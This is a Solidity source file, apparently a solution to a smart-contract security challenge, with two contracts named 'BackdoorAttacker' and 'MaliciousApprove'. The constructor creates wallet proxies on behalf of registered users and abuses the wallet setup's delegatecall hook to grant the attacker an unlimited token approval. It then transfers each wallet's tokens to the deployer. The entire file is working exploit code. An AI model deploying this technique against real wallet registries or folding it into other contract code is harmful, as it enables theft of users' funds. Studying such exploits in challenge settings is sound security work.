// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IWalletRegistry {
  function masterCopy() external view returns (address);
  function walletFactory() external view returns (address);
  function token() external view returns (IERC20);

    function proxyCreated(
        address proxy,
        address _singleton,
        bytes calldata initializer,
        uint256 saltNonce
    ) external;
}

interface IWalletFactory {
  function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        address callback
    ) external returns (address proxy);
}

contract MaliciousApprove {
  function approve(address attacker, IERC20 token) public {
      token.approve(attacker, type(uint256).max);
  }
}

contract BackdoorAttacker {
  IWalletRegistry private immutable _walletRegistry;
  IWalletFactory private immutable _walletFactory;
  address private immutable _masterCopy;
  IERC20 private immutable _token;
  MaliciousApprove private immutable _maliciousApprove;


  constructor(address walletRegistry, address[] memory users) {
    _walletRegistry = IWalletRegistry(walletRegistry);
    _masterCopy = _walletRegistry.masterCopy();
    _walletFactory = IWalletFactory(_walletRegistry.walletFactory());
    _token = _walletRegistry.token();

    _maliciousApprove = new MaliciousApprove();

    for (uint256 i = 0; i < users.length; i ++) {
      address[] memory owners = new address[](1);
      owners[0] = users[i];
      bytes memory initializer = abi.encodeWithSignature(
        "setup(address[],uint256,address,bytes,address,address,uint256,address)",
        owners,
        1,
        address(_maliciousApprove),
        abi.encodeCall(_maliciousApprove.approve, (address(this),_token)),
        address(0),
        address(0),
        0,
        address(0)
      );

      address proxy = _walletFactory.createProxyWithCallback(
        payable(_masterCopy),
        initializer,
        0,
        address(_walletRegistry)
      );
      _token.transferFrom(proxy, msg.sender, _token.balanceOf(proxy));
    }
  }
}

